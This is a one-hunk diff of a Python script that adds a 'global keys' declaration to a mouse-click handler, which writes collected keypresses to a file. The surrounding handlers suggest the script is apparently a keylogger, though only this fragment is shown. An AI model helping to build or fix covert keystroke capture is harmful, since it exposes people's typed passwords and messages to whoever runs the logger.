@@ -74,6 +74,7 @@ def on_press(key):
 
 
 def on_click(x, y, boton, presionado):
+    global keys
     if presionado:
         write_file(keys)
 
